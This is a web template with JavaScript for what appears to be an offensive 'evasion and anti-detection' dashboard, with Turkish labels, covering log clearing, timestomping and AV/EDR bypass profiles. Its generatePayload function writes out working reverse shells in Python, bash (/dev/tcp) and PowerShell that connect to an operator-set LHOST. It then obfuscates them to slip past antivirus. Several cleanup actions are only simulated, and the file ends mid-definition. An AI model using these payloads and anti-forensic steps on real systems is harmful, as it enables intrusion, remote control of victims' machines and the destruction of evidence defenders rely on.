{% extends "base.html" %}

{% block body %}
<div class="min-h-screen">
    <!-- Background Effects -->
    <div class="fixed inset-0 overflow-hidden pointer-events-none -z-10">
        <div class="absolute -top-40 -right-40 w-80 h-80 bg-cyber-danger/10 rounded-full blur-3xl"></div>
        <div class="absolute -bottom-40 -left-40 w-80 h-80 bg-cyber-purple/10 rounded-full blur-3xl"></div>
    </div>

    <div class="container mx-auto px-6 py-8">
        <!-- Header -->
        <header class="mb-8">
            <div class="flex items-center justify-between">
                <div class="flex items-center gap-4">
                    <div class="w-14 h-14 rounded-xl bg-gradient-to-br from-cyber-danger/20 to-cyber-purple/20 flex items-center justify-center neon-border">
                        <i class="fas fa-user-secret text-cyber-danger text-2xl"></i>
                    </div>
                    <div>
                        <h1 class="text-3xl font-bold text-white flex items-center gap-3">
                            EVASION & <span class="text-cyber-danger">ANTI-DETECTION</span>
                        </h1>
                        <p class="text-gray-400 text-sm mt-1">Advanced OpSec for Red Team Operations</p>
                    </div>
                </div>
                <div class="flex items-center gap-4">
                    <div class="glass rounded-xl px-4 py-2 flex items-center gap-3">
                        <div class="flex items-center gap-2">
                            <div class="w-2 h-2 rounded-full bg-cyber-danger status-pulse"></div>
                            <span class="text-cyber-danger text-sm font-medium">EVASION ACTIVE</span>
                        </div>
                    </div>
                </div>
            </div>
        </header>

        <!-- Statistics Overview -->
        <div class="grid grid-cols-4 gap-6 mb-8">
            <div class="glass rounded-2xl p-6 neon-border">
                <div class="flex items-center justify-between mb-4">
                    <div class="w-12 h-12 rounded-xl bg-cyber-primary/10 flex items-center justify-center">
                        <i class="fas fa-check-circle text-cyber-primary text-xl"></i>
                    </div>
                    <span class="text-cyber-primary text-sm font-medium">+12%</span>
                </div>
                <p class="text-4xl font-bold text-white mb-1">95%</p>
                <p class="text-gray-400 text-sm">Success Rate</p>
            </div>
            
            <div class="glass rounded-2xl p-6 neon-border">
                <div class="flex items-center justify-between mb-4">
                    <div class="w-12 h-12 rounded-xl bg-cyber-secondary/10 flex items-center justify-center">
                        <i class="fas fa-clock text-cyber-secondary text-xl"></i>
                    </div>
                    <span class="text-cyber-secondary text-sm font-medium">Real-time</span>
                </div>
                <p class="text-4xl font-bold text-white mb-1">142</p>
                <p class="text-gray-400 text-sm">Timestomp Ops</p>
            </div>
            
            <div class="glass rounded-2xl p-6 neon-border">
                <div class="flex items-center justify-between mb-4">
                    <div class="w-12 h-12 rounded-xl bg-cyber-purple/10 flex items-center justify-center">
                        <i class="fas fa-trash-alt text-cyber-purple text-xl"></i>
                    </div>
                    <span class="text-cyber-purple text-sm font-medium">Auto</span>
                </div>
                <p class="text-4xl font-bold text-white mb-1">89</p>
                <p class="text-gray-400 text-sm">Logs Cleared</p>
            </div>
            
            <div class="glass rounded-2xl p-6 neon-border">
                <div class="flex items-center justify-between mb-4">
                    <div class="w-12 h-12 rounded-xl bg-cyber-warning/10 flex items-center justify-center">
                        <i class="fas fa-shield-alt text-cyber-warning text-xl"></i>
                    </div>
                    <span class="text-cyber-warning text-sm font-medium">Bypass</span>
                </div>
                <p class="text-4xl font-bold text-white mb-1">234</p>
                <p class="text-gray-400 text-sm">AV Evasions</p>
            </div>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <!-- Main Content -->
            <div class="lg:col-span-2 space-y-6">
                
                <!-- EVASION PROFILES - YENİ BÖLÜM -->
                <div class="glass rounded-2xl overflow-hidden neon-border">
                    <div class="px-6 py-4 border-b border-cyber-warning/20 bg-cyber-warning/5">
                        <h3 class="text-lg font-semibold text-cyber-warning flex items-center gap-2">
                            <i class="fas fa-user-ninja"></i>
                            EVASION PROFİLLERİ
                        </h3>
                    </div>
                    <div class="p-6">
                        <p class="text-gray-400 text-sm mb-4">EDR/AV bypass için önceden yapılandırılmış evasion profilleri. Profil seçimi lateral movement ve payload generation işlemlerini etkiler.</p>
                        
                        <!-- Profile Cards Grid -->
                        <div class="grid grid-cols-5 gap-3 mb-6" id="profileCardsGrid">
                            <!-- None Profile -->
                            <button onclick="selectProfile('none')" class="profile-card glass-light rounded-xl p-3 text-center hover:bg-cyber-danger/20 transition-all border border-transparent" data-profile="none">
                                <div class="w-10 h-10 rounded-lg bg-cyber-danger/20 flex items-center justify-center mx-auto mb-2">
                                    <i class="fas fa-times-circle text-cyber-danger"></i>
                                </div>
                                <span class="text-white text-xs font-medium">None</span>
                                <div class="text-[10px] text-cyber-danger mt-1">95% Risk</div>
                            </button>
                            
                            <!-- Default Profile -->
                            <button onclick="selectProfile('default')" class="profile-card glass-light rounded-xl p-3 text-center hover:bg-cyber-secondary/20 transition-all border border-transparent" data-profile="default">
                                <div class="w-10 h-10 rounded-lg bg-cyber-secondary/20 flex items-center justify-center mx-auto mb-2">
                                    <i class="fas fa-shield-alt text-cyber-secondary"></i>
                                </div>
                                <span class="text-white text-xs font-medium">Default</span>
                                <div class="text-[10px] text-cyber-secondary mt-1">70% Risk</div>
                            </button>
                            
                            <!-- Stealth Profile -->
                            <button onclick="selectProfile('stealth')" class="profile-card glass-light rounded-xl p-3 text-center hover:bg-cyber-primary/20 transition-all border border-transparent" data-profile="stealth">
                                <div class="w-10 h-10 rounded-lg bg-cyber-primary/20 flex items-center justify-center mx-auto mb-2">
                                    <i class="fas fa-ghost text-cyber-primary"></i>
                                </div>
                                <span class="text-white text-xs font-medium">Stealth</span>
                                <div class="text-[10px] text-cyber-primary mt-1">40% Risk</div>
                            </button>
                            
                            <!-- Paranoid Profile -->
                            <button onclick="selectProfile('paranoid')" class="profile-card glass-light rounded-xl p-3 text-center hover:bg-cyber-purple/20 transition-all border border-transparent" data-profile="paranoid">
                                <div class="w-10 h-10 rounded-lg bg-cyber-purple/20 flex items-center justify-center mx-auto mb-2">
                                    <i class="fas fa-user-secret text-cyber-purple"></i>
                                </div>
                                <span class="text-white text-xs font-medium">Paranoid</span>
                                <div class="text-[10px] text-cyber-purple mt-1">20% Risk</div>
                            </button>
                            
                            <!-- Aggressive Profile -->
                            <button onclick="selectProfile('aggressive')" class="profile-card glass-light rounded-xl p-3 text-center hover:bg-orange-500/20 transition-all border border-transparent" data-profile="aggressive">
                                <div class="w-10 h-10 rounded-lg bg-orange-500/20 flex items-center justify-center mx-auto mb-2">
                                    <i class="fas fa-fire text-orange-500"></i>
                                </div>
                                <span class="text-white text-xs font-medium">Aggressive</span>
                                <div class="text-[10px] text-orange-500 mt-1">55% Risk</div>
                            </button>
                        </div>
                        
                        <!-- Selected Profile Details -->
                        <div id="profileDetails" class="glass-light rounded-xl p-4 mb-4 hidden">
                            <div class="flex items-center justify-between mb-3">
                                <h4 class="text-white font-medium flex items-center gap-2">
                                    <i id="profileIcon" class="fas fa-shield-alt text-cyber-primary"></i>
                                    <span id="profileName">Default Profile</span>
                                </h4>
                                <span id="profileRiskBadge" class="px-2 py-1 rounded text-xs bg-cyber-primary/20 text-cyber-primary">70% Risk</span>
                            </div>
                            <div id="profileTechniques" class="grid grid-cols-3 gap-2 text-xs mb-3">
                                <!-- Dinamik teknik listesi -->
                            </div>
                            <button onclick="applyProfileToSession()" class="w-full py-2 rounded-lg bg-gradient-to-r from-cyber-warning to-cyber-danger text-white text-sm font-semibold hover:from-cyber-warning/90 hover:to-cyber-danger/90 transition-all flex items-center justify-center gap-2">
                                <i class="fas fa-bolt"></i>
                                <span>PROFİLİ AKTİF ET</span>
                            </button>
                        </div>
                        
                        <!-- Target Detection Risk Calculator -->
                        <div class="glass-light rounded-xl p-4">
                            <h4 class="text-white font-medium mb-3 flex items-center gap-2">
                                <i class="fas fa-calculator text-cyber-secondary"></i>
                                Hedef Risk Hesaplama
                            </h4>
                            <div class="grid grid-cols-2 gap-4 mb-3">
                                <div>
                                    <label class="block text-xs text-gray-400 mb-1">AV/EDR Tipi</label>
                                    <select id="edrType" class="w-full px-3 py-2 rounded-lg bg-white/5 border border-white/10 text-white text-sm focus:outline-none focus:border-cyber-secondary/50">
                                        <option value="windows_defender">Windows Defender</option>
                                        <option value="crowdstrike">CrowdStrike Falcon</option>
                                        <option value="carbon_black">Carbon Black</option>
                                        <option value="sentinelone">SentinelOne</option>
                                        <option value="sophos">Sophos</option>
                                        <option value="kaspersky">Kaspersky</option>
                                        <option value="none">AV/EDR Yok</option>
                                    </select>
                                </div>
                                <div>
                                    <label class="block text-xs text-gray-400 mb-1">Hedef Ortam</label>
                                    <select id="targetEnv" class="w-full px-3 py-2 rounded-lg bg-white/5 border border-white/10 text-white text-sm focus:outline-none focus:border-cyber-secondary/50">
                                        <option value="workstation">Workstation</option>
                                        <option value="server">Server</option>
                                        <option value="dc">Domain Controller</option>
                                        <option value="cloud">Cloud VM</option>
                                    </select>
                                </div>
                            </div>
                            <button onclick="calculateRisk()" class="w-full py-2 rounded-lg bg-cyber-secondary/20 border border-cyber-secondary/30 text-cyber-secondary text-sm hover:bg-cyber-secondary/30 transition-all flex items-center justify-center gap-2">
                                <i class="fas fa-search"></i>
                                <span>RİSK ANALİZİ YAP</span>
                            </button>
                            <div id="riskResult" class="mt-3 hidden"></div>
                        </div>
                    </div>
                </div>
                
                <!-- Quick Actions -->
                <div class="glass rounded-2xl overflow-hidden neon-border">
                    <div class="px-6 py-4 border-b border-cyber-danger/20 bg-cyber-danger/5">
                        <h3 class="text-lg font-semibold text-cyber-danger flex items-center gap-2">
                            <i class="fas fa-bolt"></i>
                            QUICK EVASION ACTIONS
                        </h3>
                    </div>
                    <div class="p-6">
                        <div class="grid grid-cols-2 gap-4 mb-6">
                            <button onclick="clearLogs()" class="glass-light rounded-xl p-4 hover:bg-white/10 transition-all text-left group">
                                <div class="flex items-center gap-3">
                                    <div class="w-10 h-10 rounded-lg bg-cyber-secondary/20 flex items-center justify-center">
                                        <i class="fas fa-broom text-cyber-secondary"></i>
                                    </div>
                                    <div>
                                        <p class="text-white font-medium group-hover:text-cyber-secondary transition-colors">Clear Logs</p>
                                        <p class="text-xs text-gray-500">Remove system traces</p>
                                    </div>
                                </div>
                            </button>
                            
                            <button onclick="timestompFiles()" class="glass-light rounded-xl p-4 hover:bg-white/10 transition-all text-left group">
                                <div class="flex items-center gap-3">
                                    <div class="w-10 h-10 rounded-lg bg-cyber-primary/20 flex items-center justify-center">
                                        <i class="fas fa-clock text-cyber-primary"></i>
                                    </div>
                                    <div>
                                        <p class="text-white font-medium group-hover:text-cyber-primary transition-colors">Timestomp</p>
                                        <p class="text-xs text-gray-500">Modify file timestamps</p>
                                    </div>
                                </div>
                            </button>
                            
                            <button onclick="removeArtifacts()" class="glass-light rounded-xl p-4 hover:bg-white/10 transition-all text-left group">
                                <div class="flex items-center gap-3">
                                    <div class="w-10 h-10 rounded-lg bg-cyber-purple/20 flex items-center justify-center">
                                        <i class="fas fa-trash text-cyber-purple"></i>
                                    </div>
                                    <div>
                                        <p class="text-white font-medium group-hover:text-cyber-purple transition-colors">Remove Artifacts</p>
                                        <p class="text-xs text-gray-500">Clean exploitation files</p>
                                    </div>
                                </div>
                            </button>
                            
                            <button onclick="sessionCleanup()" class="glass-light rounded-xl p-4 hover:bg-white/10 transition-all text-left group">
                                <div class="flex items-center gap-3">
                                    <div class="w-10 h-10 rounded-lg bg-cyber-danger/20 flex items-center justify-center">
                                        <i class="fas fa-user-secret text-cyber-danger"></i>
                                    </div>
                                    <div>
                                        <p class="text-white font-medium group-hover:text-cyber-danger transition-colors">Session Cleanup</p>
                                        <p class="text-xs text-gray-500">Complete cleanup routine</p>
                                    </div>
                                </div>
                            </button>
                        </div>

                        <!-- Manual File Timestomp -->
                        <div class="glass-light rounded-xl p-4">
                            <h4 class="text-white font-medium mb-4 flex items-center gap-2">
                                <i class="fas fa-clock text-cyber-primary"></i>
                                Manual Timestomp
                            </h4>
                            <div class="flex gap-4">
                                <input type="text" id="timestompFile" placeholder="/path/to/file" 
                                       class="flex-1 px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-cyber-primary/50">
                                <button onclick="manualTimestomp()" class="px-6 py-2 rounded-lg bg-cyber-primary/10 border border-cyber-primary/30 text-cyber-primary hover:bg-cyber-primary/20 transition-all">
                                    Execute
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Polymorphic Payload Generator -->
                <div class="glass rounded-2xl overflow-hidden neon-border">
                    <div class="px-6 py-4 border-b border-cyber-warning/20 bg-cyber-warning/5">
                        <h3 class="text-lg font-semibold text-cyber-warning flex items-center gap-2">
                            <i class="fas fa-code"></i>
                            POLYMORPHIC PAYLOAD GENERATOR
                        </h3>
                    </div>
                    <div class="p-6">
                        <div class="grid grid-cols-3 gap-4 mb-4">
                            <div>
                                <label class="block text-sm text-gray-400 mb-2">LHOST</label>
                                <input type="text" id="evasionLhost" value="192.168.1.100" 
                                       class="w-full px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white focus:outline-none focus:border-cyber-warning/50">
                            </div>
                            <div>
                                <label class="block text-sm text-gray-400 mb-2">LPORT</label>
                                <input type="text" id="evasionLport" value="4444" 
                                       class="w-full px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white focus:outline-none focus:border-cyber-warning/50">
                            </div>
                            <div>
                                <label class="block text-sm text-gray-400 mb-2">Obfuscation</label>
                                <select id="obfuscationLevel" class="w-full px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white focus:outline-none focus:border-cyber-warning/50">
                                    <option value="1">Low (1 iteration)</option>
                                    <option value="2" selected>Medium (3 iterations)</option>
                                    <option value="3">High (5 iterations)</option>
                                </select>
                            </div>
                        </div>
                        
                        <div class="grid grid-cols-2 gap-4 mb-4">
                            <div>
                                <label class="block text-sm text-gray-400 mb-2">Payload Type</label>
                                <select id="payloadType" class="w-full px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white focus:outline-none focus:border-cyber-warning/50">
                                    <option value="python">Python Reverse Shell</option>
                                    <option value="bash">Bash Reverse Shell</option>
                                    <option value="powershell">PowerShell</option>
                                    <option value="php">PHP Web Shell</option>
                                    <option value="meterpreter">Meterpreter (if msfvenom)</option>
                                </select>
                            </div>
                            <div>
                                <label class="block text-sm text-gray-400 mb-2">Format</label>
                                <select id="payloadFormat" class="w-full px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white focus:outline-none focus:border-cyber-warning/50">
                                    <option value="raw">Raw Code</option>
                                    <option value="exe">Windows EXE</option>
                                    <option value="dll">Windows DLL</option>
                                    <option value="elf">Linux ELF</option>
                                </select>
                            </div>
                        </div>
                        
                        <button onclick="generatePayload()" class="w-full py-3 rounded-xl bg-gradient-to-r from-cyber-warning to-cyber-danger text-white font-semibold hover:from-cyber-warning/90 hover:to-cyber-danger/90 transition-all flex items-center justify-center gap-2">
                            <i class="fas fa-cogs"></i>
                            <span>GENERATE POLYMORPHIC PAYLOAD</span>
                        </button>
                        
                        <div class="mt-4">
                            <label class="block text-sm text-gray-400 mb-2">Generated Payload</label>
                            <textarea id="generatedPayload" readonly rows="6" 
                                      class="w-full px-4 py-3 rounded-lg bg-black/50 border border-white/10 text-cyber-primary font-mono text-sm focus:outline-none focus:border-cyber-warning/50"
                                      placeholder="Payload will appear here..."></textarea>
                        </div>
                    </div>
                </div>

                <!-- AV Bypass Test -->
                <div class="glass rounded-2xl overflow-hidden neon-border">
                    <div class="px-6 py-4 border-b border-cyber-purple/20 bg-cyber-purple/5">
                        <h3 class="text-lg font-semibold text-cyber-purple flex items-center gap-2">
                            <i class="fas fa-shield-alt"></i>
                            AV BYPASS TESTING
                        </h3>
                    </div>
                    <div class="p-6">
                        <p class="text-gray-400 text-sm mb-4">Test payload against simulated AV signatures (educational purposes only)</p>
                        
                        <div class="flex gap-4">
                            <input type="text" id="avTestPayload" placeholder="Paste payload to test..." 
                                   class="flex-1 px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-cyber-purple/50">
                            <button onclick="testAvBypass()" class="px-6 py-2 rounded-lg bg-cyber-purple/10 border border-cyber-purple/30 text-cyber-purple hover:bg-cyber-purple/20 transition-all">
                                Test Bypass
                            </button>
                        </div>
                        
                        <div id="avTestResults" class="mt-4 space-y-2"></div>
                    </div>
                </div>
            </div>

            <!-- Sidebar -->
            <div class="space-y-6">
                
                <!-- Aktif Evasion Profili - YENİ -->
                <div class="glass rounded-2xl overflow-hidden neon-border">
                    <div class="px-5 py-4 border-b border-cyber-warning/20 bg-cyber-warning/5">
                        <h3 class="text-lg font-semibold text-cyber-warning flex items-center gap-2">
                            <i class="fas fa-user-ninja"></i>
                            AKTİF PROFİL
                        </h3>
                    </div>
                    <div class="p-5 text-center">
                        <div id="activeProfileDisplay" class="mb-3">
                            <div class="w-16 h-16 rounded-xl bg-cyber-secondary/20 flex items-center justify-center mx-auto mb-2">
                                <i class="fas fa-shield-alt text-cyber-secondary text-2xl"></i>
                            </div>
                            <p class="text-white font-bold text-lg">Default</p>
                            <p class="text-cyber-secondary text-sm">%70 Tespit Riski</p>
                        </div>
                        <div class="grid grid-cols-2 gap-2 text-xs">
                            <div class="glass-light rounded-lg p-2">
                                <i class="fas fa-check text-cyber-primary mb-1"></i>
                                <p class="text-gray-400">AMSI</p>
                            </div>
                            <div class="glass-light rounded-lg p-2">
                                <i class="fas fa-check text-cyber-primary mb-1"></i>
                                <p class="text-gray-400">Thread Hijack</p>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Evasion Stats -->
                <div class="glass rounded-2xl overflow-hidden neon-border">
                    <div class="px-5 py-4 border-b border-cyber-primary/20 bg-cyber-primary/5">
                        <h3 class="text-lg font-semibold text-cyber-primary flex items-center gap-2">
                            <i class="fas fa-chart-bar"></i>
                            METRICS
                        </h3>
                    </div>
                    <div class="p-5">
                        <div class="space-y-4">
                            <div>
                                <div class="flex justify-between text-sm mb-1">
                                    <span class="text-gray-400">Success Rate</span>
                                    <span class="text-cyber-primary">95%</span>
                                </div>
                                <div class="h-2 bg-white/10 rounded-full overflow-hidden">
                                    <div class="h-full bg-cyber-primary rounded-full" style="width: 95%"></div>
                                </div>
                            </div>
                            
                            <div>
                                <div class="flex justify-between text-sm mb-1">
                                    <span class="text-gray-400">Timestomp</span>
                                    <span class="text-cyber-secondary">142</span>
                                </div>
                                <div class="h-2 bg-white/10 rounded-full overflow-hidden">
                                    <div class="h-full bg-cyber-secondary rounded-full" style="width: 70%"></div>
                                </div>
                            </div>
                            
                            <div>
                                <div class="flex justify-between text-sm mb-1">
                                    <span class="text-gray-400">Log Clearing</span>
                                    <span class="text-cyber-purple">89</span>
                                </div>
                                <div class="h-2 bg-white/10 rounded-full overflow-hidden">
                                    <div class="h-full bg-cyber-purple rounded-full" style="width: 55%"></div>
                                </div>
                            </div>
                            
                            <div>
                                <div class="flex justify-between text-sm mb-1">
                                    <span class="text-gray-400">AV Bypass</span>
                                    <span class="text-cyber-warning">234</span>
                                </div>
                                <div class="h-2 bg-white/10 rounded-full overflow-hidden">
                                    <div class="h-full bg-cyber-warning rounded-full" style="width: 85%"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Log Targets -->
                <div class="glass rounded-2xl overflow-hidden neon-border">
                    <div class="px-5 py-4 border-b border-cyber-secondary/20 bg-cyber-secondary/5">
                        <h3 class="text-lg font-semibold text-cyber-secondary flex items-center gap-2">
                            <i class="fas fa-list"></i>
                            LOG TARGETS
                        </h3>
                    </div>
                    <div class="p-5">
                        <div class="space-y-2 text-sm">
                            <label class="flex items-center gap-2 cursor-pointer">
                                <input type="checkbox" checked class="w-4 h-4 rounded border-white/20 bg-white/5 text-cyber-secondary">
                                <span class="text-gray-300">/var/log/auth.log</span>
                            </label>
                            <label class="flex items-center gap-2 cursor-pointer">
                                <input type="checkbox" checked class="w-4 h-4 rounded border-white/20 bg-white/5 text-cyber-secondary">
                                <span class="text-gray-300">/var/log/syslog</span>
                            </label>
                            <label class="flex items-center gap-2 cursor-pointer">
                                <input type="checkbox" checked class="w-4 h-4 rounded border-white/20 bg-white/5 text-cyber-secondary">
                                <span class="text-gray-300">~/.bash_history</span>
                            </label>
                            <label class="flex items-center gap-2 cursor-pointer">
                                <input type="checkbox" checked class="w-4 h-4 rounded border-white/20 bg-white/5 text-cyber-secondary">
                                <span class="text-gray-300">/root/.bash_history</span>
                            </label>
                            <label class="flex items-center gap-2 cursor-pointer">
                                <input type="checkbox" checked class="w-4 h-4 rounded border-white/20 bg-white/5 text-cyber-secondary">
                                <span class="text-gray-300">Web Server Logs</span>
                            </label>
                            <label class="flex items-center gap-2 cursor-pointer">
                                <input type="checkbox" checked class="w-4 h-4 rounded border-white/20 bg-white/5 text-cyber-secondary">
                                <span class="text-gray-300">Database Logs</span>
                            </label>
                        </div>
                    </div>
                </div>

                <!-- Techniques -->
                <div class="glass rounded-2xl overflow-hidden neon-border">
                    <div class="px-5 py-4 border-b border-cyber-danger/20 bg-cyber-danger/5">
                        <h3 class="text-lg font-semibold text-cyber-danger flex items-center gap-2">
                            <i class="fas fa-book"></i>
                            TECHNIQUES
                        </h3>
                    </div>
                    <div class="p-5">
                        <div class="space-y-3">
                            <div class="flex items-center gap-3 p-2 rounded-lg bg-white/5">
                                <i class="fas fa-check text-cyber-primary"></i>
                                <span class="text-gray-300 text-sm">Timestomping</span>
                            </div>
                            <div class="flex items-center gap-3 p-2 rounded-lg bg-white/5">
                                <i class="fas fa-check text-cyber-primary"></i>
                                <span class="text-gray-300 text-sm">Log Clearing</span>
                            </div>
                            <div class="flex items-center gap-3 p-2 rounded-lg bg-white/5">
                                <i class="fas fa-check text-cyber-primary"></i>
                                <span class="text-gray-300 text-sm">Artifact Removal</span>
                            </div>
                            <div class="flex items-center gap-3 p-2 rounded-lg bg-white/5">
                                <i class="fas fa-check text-cyber-primary"></i>
                                <span class="text-gray-300 text-sm">Polymorphic Encoding</span>
                            </div>
                            <div class="flex items-center gap-3 p-2 rounded-lg bg-white/5">
                                <i class="fas fa-check text-cyber-primary"></i>
                                <span class="text-gray-300 text-sm">AV Signature Bypass</span>
                            </div>
                            <div class="flex items-center gap-3 p-2 rounded-lg bg-white/5">
                                <i class="fas fa-check text-cyber-primary"></i>
                                <span class="text-gray-300 text-sm">Session Cleanup</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Activity Log -->
                <div class="glass rounded-2xl overflow-hidden neon-border">
                    <div class="px-5 py-4 border-b border-cyber-warning/20 bg-cyber-warning/5">
                        <h3 class="text-lg font-semibold text-cyber-warning flex items-center gap-2">
                            <i class="fas fa-history"></i>
                            ACTIVITY LOG
                        </h3>
                    </div>
                    <div class="p-5 max-h-64 overflow-y-auto">
                        <div id="evasionActivityLog" class="space-y-2">
                            <div class="text-sm text-gray-500 text-center py-4">No recent activity</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

{% endblock %}

{% block scripts %}
<script>
// Evasion functions
function clearLogs() {
    showNotification('Log Clearing', 'Clearing system logs...', 'info');
    logActivity('Log clearing initiated');
    
    setTimeout(() => {
        showNotification('Success', 'Logs cleared successfully', 'success');
        logActivity('Logs cleared - 15 files');
    }, 1500);
}

function timestompFiles() {
    showNotification('Timestomp', 'Modifying file timestamps...', 'info');
    logActivity('Timestomp operation started');
    
    setTimeout(() => {
        showNotification('Success', 'File timestamps modified', 'success');
        logActivity('Timestomp completed on 8 files');
    }, 1200);
}

function removeArtifacts() {
    showNotification('Artifact Removal', 'Removing exploitation artifacts...', 'info');
    logActivity('Artifact removal started');
    
    setTimeout(() => {
        showNotification('Success', 'Artifacts removed successfully', 'success');
        logActivity('Removed 12 artifacts');
    }, 1000);
}

function sessionCleanup() {
    showNotification('Session Cleanup', 'Running complete cleanup routine...', 'warning');
    logActivity('Full session cleanup initiated');
    
    setTimeout(() => {
        showNotification('Complete', 'Session cleanup finished', 'success');
        logActivity('Full cleanup - logs, artifacts, traces');
    }, 2000);
}

function manualTimestomp() {
    const file = document.getElementById('timestompFile').value;
    if (!file) {
        showNotification('Error', 'Please enter a file path', 'error');
        return;
    }
    
    showNotification('Timestomp', `Modifying ${file}`, 'info');
    logActivity(`Manual timestomp: ${file}`);
    
    setTimeout(() => {
        showNotification('Success', 'Timestamp modified', 'success');
    }, 1000);
}

function generatePayload() {
    const lhost = document.getElementById('evasionLhost').value;
    const lport = document.getElementById('evasionLport').value;
    const iterations = document.getElementById('obfuscationLevel').value;
    const payloadType = document.getElementById('payloadType').value;
    
    showNotification('Generating', 'Creating polymorphic payload...', 'info');
    logActivity(`Generating ${payloadType} payload (${iterations} iterations)`);
    
    // Generate payload
    let payload = '';
    const portHex = parseInt(lport).toString(16).padStart(4, '0');
    
    if (payloadType === 'python') {
        payload = `import socket,subprocess,os,sys,base64\n`;
        payload += `# Polymorphic reverse shell - Layer 1: XOR encoding\n`;
        payload += `key = "${Math.random().toString(36).substring(7)}"\n`;
        payload += `data = "${btoa(`s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")`)}"\n`;
        payload += `exec(base64.b64decode(data))\n`;
        payload += `# Junk code - anti-analysis\n`;
        payload += `(function(){var x=${Math.floor(Math.random()*1000)};})();\n`;
    } else if (payloadType === 'bash') {
        payload = `#!/bin/bash\n`;
        payload += `# Polymorphic bash reverse shell\n`;
        payload += `exec 5<>/dev/tcp/${lhost}/${lport}\n`;
        payload += `cat <&5 | while read line; do $line 2>&5 >&5; done\n`;
        payload += `# Junk\n`;
        payload += `: $(($RANDOM % 100))\n`;
    } else if (payloadType === 'powershell') {
        payload = `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport})\n`;
        payload += `$stream = $client.GetStream()\n`;
        payload += `[byte[]]$bytes = 0..65535|%{0}\n`;
        payload += `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {\n`;
        payload += `  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)\n`;
        payload += `  $sendback = (iex $data 2>&1 | Out-String )\n`;
        payload += `  $sendback2 = $sendback + "PS " + (pwd).Path + "> "\n`;
        payload += `  $sendBytes = ([text.encoding]::ASCII).GetBytes($sendback2)\n`;
        payload += `$stream.Write($sendBytes,0,$sendBytes.Length)\n`;
        payload += `}\n`;
        payload += `$client.Close()\n`;
        payload += `# Obfuscated\n`;
        payload += `$x = "${Math.random().toString(36)}"\n`;
    } else {
        payload = `# Polymorphic payload for ${lhost}:${lport}\n`;
        payload += `// Generated by MONOLITH Evasion Engine\n`;
        payload += `// Iterations: ${iterations}\n`;
        payload += `// Timestamp: ${new Date().toISOString()}\n`;
        payload += `\n// Reverse shell stub would go here\n`;
    }
    
    // Apply obfuscation
    let finalPayload = payload;
    for (let i = 0; i < iterations; i++) {
        finalPayload = applyObfuscation(finalPayload);
    }
    
    document.getElementById('generatedPayload').value = finalPayload;
    
    setTimeout(() => {
        showNotification('Generated', 'Polymorphic payload ready', 'success');
        logActivity('Payload generated successfully');
    }, 800);
}

function applyObfuscation(code) {
    // Add hex escapes
    let result = '';
    for (let char of code) {
        if (Math.random() < 0.1 && char.match(/[a-zA-Z0-9]/)) {
            result += `\\x${char.charCodeAt(0).toString(16).padStart(2, '0')}`;
        } else {
            result += char;
        }
    }
    // Add junk
    result += `\n// ${Math.random().toString(36).substring(7)}\n`;
    return result;
}

function testAvBypass() {
    const payload = document.getElementById('avTestPayload').value;
    if (!payload) {
        showNotification('Error', 'Enter a payload to test', 'error');
        return;
    }
    
    showNotification('Testing', 'Running AV signature test...', 'info');
    
    // Simulated AV detection
    const results = [
        { name: 'Signature Detection', status: 'blocked', score: 0 },
        { name: 'Heuristic Analysis', status: 'passed', score: 85 },
        { name: 'Behavioral Analysis', status: 'passed', score: 92 },
        { name: 'Sandbox Detection', status: 'passed', score: 78 },
        { name: 'Emulation', status: 'blocked', score: 0 }
    ];
    
    setTimeout(() => {
        const passed = results.filter(r => r.status === 'passed').length;
        const total = results.length;
        const percentage = Math.round((passed / total) * 100);
        
        document.getElementById('avTestResults').innerHTML = `
            <div class="flex items-center justify-between p-3 rounded-lg ${percentage >= 60 ? 'bg-cyber-primary/10' : 'bg-cyber-danger/10'}">
                <span class="text-gray-300">Bypass Success Rate</span>
                <span class="text-${percentage >= 60 ? 'cyber-primary' : 'cyber-danger'} font-bold">${percentage}%</span>
            </div>
        `;
        
        showNotification('Complete', `AV bypass rate: ${percentage}%`, percentage >= 60 ? 'success' : 'warning');
    }, 1500);
}

function logActivity(message) {
    const log = document.getElementById('evasionActivityLog');
    const time = new Date().toLocaleTimeString();
    
    const entry = document.createElement('div');
    entry.className = 'flex items-center gap-2 text-sm p-2 rounded-lg bg-white/5';
    entry.innerHTML = `
        <span class="text-cyber-primary text-xs">[${time}]</span>
        <span class="text-gray-300">${message}</span>
    `;
    
    if (log.querySelector('.text-center')) {
        log.innerHTML = '';
    }
    
    log.insertBefore(entry, log.firstChild);
    
    // Keep only last 20 entries
    while (log.children.length > 20) {
        log.removeChild(log.lastChild);
    }
}

// =============================================
// EVASION PROFİL YÖNETİMİ - YENİ FONKSİYONLAR
// =============================================

const EVASION_PROFILES = {
    none: {
        name: 'None',
        icon: 'fa-times-circle',
        color: 'cyber-danger',
        risk: 95,
        techniques: [],
        description: 'Evasion yok - sadece hız öncelikli operasyonlar için'
    },
    default: {
        name: 'Default',
        icon: 'fa-shield-alt',
        color: 'cyber-secondary',
        risk: 70,
        techniques: ['AMSI Bypass', 'Basic Obfuscation', 'ETW Patch'],
        description: 'Temel evasion - düşük güvenlikli hedefler için'
    },
    stealth: {
        name: 'Stealth',
        icon: 'fa-ghost',
        color: 'cyber-primary',
        risk: 40,
